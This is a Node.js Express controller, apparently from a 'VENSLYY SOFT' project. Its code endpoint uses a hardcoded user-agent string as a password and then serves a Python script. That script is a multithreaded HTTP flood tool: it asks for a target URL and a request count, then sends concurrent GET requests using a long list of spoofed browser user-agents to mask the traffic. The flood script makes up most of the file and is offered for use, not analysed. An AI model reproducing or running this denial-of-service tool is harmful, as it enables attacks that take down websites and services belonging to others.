const uuid = require('uuid')
const path = require('path');
// const {Device, DeviceInfo} = require('../models/models')
// const ApiError = require('../error/ApiError');

class testController {
    async test(req, res, next) {
        const userAgent = req.headers["user-agent"];
        let Sstatus;

        if (userAgent === "python-requests/2.31.0") {
            Sstatus = "Access allowed";
        } else {
            Sstatus = "Access denied";
        }

        return res.json(Sstatus);
    }
    async code(req, res, next){
        const userAgent = req.headers["user-agent"];
        let Sstatus;
        let code;

        if (userAgent === "VENSLYYSOFT") {
            Sstatus = true;
        } else {
            Sstatus = false;
        }

        if(Sstatus === true){
            const pythonCode = `
print("VENSLYY SOFT")
import pystyle
import threading
import requests
import random

url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.white_to_red, interval=0.005)
num_requests = int(
    pystyle.Write.Input(
        "[?] Введите количество запросов: ", pystyle.Colors.white_to_red, interval=0.005
    )
)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    "Mozilla/5.0 (Android; Android 7.0; Pixel XL Build/NRD90M) AppleWebKit/600.12 (KHTML, like Gecko)  Chrome/48.0.1743.333 Mobile Safari/603.3",
    "Mozilla/5.0 (Windows NT 6.0; x64) Gecko/20100101 Firefox/45.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_3; like Mac OS X) AppleWebKit/603.8 (KHTML, like Gecko)  Chrome/54.0.3488.311 Mobile Safari/534.3",
    "Mozilla/5.0 (Linux; U; Linux x86_64; en-US) Gecko/20130401 Firefox/56.5",
    "Mozilla/5.0 (Linux x86_64) AppleWebKit/533.5 (KHTML, like Gecko) Chrome/47.0.1992.189 Safari/537",
    "Mozilla/5.0 (Windows; U; Windows NT 10.4; x64) Gecko/20100101 Firefox/55.7",
    "Mozilla/5.0 (iPod; CPU iPod OS 11_0_6; like Mac OS X) AppleWebKit/602.48 (KHTML, like Gecko)  Chrome/50.0.2518.370 Mobile Safari/534.8",
    "Mozilla/5.0 (iPod; CPU iPod OS 11_0_6; like Mac OS X) AppleWebKit/602.48 (KHTML, like Gecko)  Chrome/50.0.2518.370 Mobile Safari/534.8",
    "Mozilla/5.0 (iPod; CPU iPod OS 10_8_6; like Mac OS X) AppleWebKit/602.15 (KHTML, like Gecko)  Chrome/49.0.2663.187 Mobile Safari/601.8",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64 Trident/4.0)",
    "Mozilla/5.0 (U; Linux x86_64) AppleWebKit/603.43 (KHTML, like Gecko) Chrome/47.0.1919.139 Safari/533",
    "Mozilla/5.0 (iPad; CPU iPad OS 11_9_8 like Mac OS X) AppleWebKit/601.19 (KHTML, like Gecko)  Chrome/51.0.2881.396 Mobile Safari/603.1",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.3; WOW64 Trident/4.0)",
    "Mozilla/5.0 (Linux; U; Linux i685 x86_64) AppleWebKit/537.15 (KHTML, like Gecko) Chrome/47.0.3876.354 Safari/603",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_8; like Mac OS X) AppleWebKit/533.25 (KHTML, like Gecko)  Chrome/55.0.1619.341 Mobile Safari/602.8",
    "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; en-US Trident/4.0)",
    "Mozilla/5.0 (U; Linux x86_64; en-US) Gecko/20100101 Firefox/66.3",
    "Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64) AppleWebKit/603.18 (KHTML, like Gecko) Chrome/48.0.1742.268 Safari/601.4 Edge/18.62165",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_4) Gecko/20100101 Firefox/45.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_6; like Mac OS X) AppleWebKit/602.15 (KHTML, like Gecko)  Chrome/54.0.1370.397 Mobile Safari/534.9",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/603.47 (KHTML, like Gecko) Chrome/52.0.3010.341 Safari/601",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G920FD Build/LRX22G) AppleWebKit/602.3 (KHTML, like Gecko)  Chrome/48.0.2891.355 Mobile Safari/603.4",
    "Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64; en-US) Gecko/20100101 Firefox/47.5",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_4; like Mac OS X) AppleWebKit/537.8 (KHTML, like Gecko)  Chrome/51.0.2035.326 Mobile Safari/601.2",
    "Mozilla/5.0 (Linux; Linux x86_64) Gecko/20100101 Firefox/74.7",
    "Mozilla/5.0 (Windows; Windows NT 10.4; x64) AppleWebKit/534.38 (KHTML, like Gecko) Chrome/51.0.2840.171 Safari/601.9 Edge/13.80792",
    "Mozilla/5.0 (Android; Android 5.1; MOTO XT1562 Build/LPK23) AppleWebKit/600.1 (KHTML, like Gecko)  Chrome/47.0.3175.299 Mobile Safari/601.5",
    "Mozilla/5.0 (Windows; Windows NT 10.1; x64; en-US) AppleWebKit/602.19 (KHTML, like Gecko) Chrome/53.0.3416.272 Safari/537.0 Edge/9.87317",
    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64 Trident/4.0)",
    "Mozilla/5.0 (Windows NT 10.1; WOW64; en-US) AppleWebKit/535.12 (KHTML, like Gecko) Chrome/54.0.3073.178 Safari/536.3 Edge/8.31978",
    "Mozilla/5.0 (Windows; U; Windows NT 6.2; Win64; x64; en-US) Gecko/20100101 Firefox/70.0",
    "Mozilla/5.0 (Windows NT 6.0; x64; en-US) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/47.0.2953.158 Safari/602",
]


def send_request(i):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        code = response.status_code
        print(f"{i} sent successfully. {code}\\n")
    except:
        print(response)
        print(f"[-] Request don't sent\\n")


threads = []
for i in range(1, num_requests + 1):
    t = threading.Thread(target=send_request, args=[i])
    t.start()
    threads.append(t)
for t in threads:
    t.join()
            `
            // const formattedCode = pythonCode.replace(/\n/g, "<br>"); // Заменяем на 4 пробела
            code = JSON.stringify({ code: pythonCode });
        } else {
            code = JSON.stringify({ error: "Неверный пароль!" });
        }

        return res.json(JSON.parse(code))
    }
}

module.exports = new testController();